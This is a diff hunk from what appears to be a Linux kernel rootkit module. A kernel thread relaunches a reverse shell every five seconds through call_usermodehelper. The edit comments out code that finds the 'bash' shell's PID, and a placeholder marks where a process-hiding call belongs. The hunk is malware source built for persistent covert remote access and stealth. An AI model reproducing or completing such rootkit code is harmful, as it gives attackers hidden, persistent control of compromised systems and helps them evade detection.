@@ -308,10 +308,10 @@ static int lauch_sh_function(void *data) {
     while (!kthread_should_stop()) {
         ret = call_usermodehelper(revshell_argv[0], revshell_argv, envp, UMH_WAIT_EXEC);
         // Rechercher le PID du script
-        revshell_pid = find_pid_by_name("bash");
-        if (revshell_pid > 0) {
+        // revshell_pid = find_pid_by_name("bash");
+        // if (revshell_pid > 0) {
             //call the hide_process function here
-        }
+        // }
         ssleep(5);
     }
 
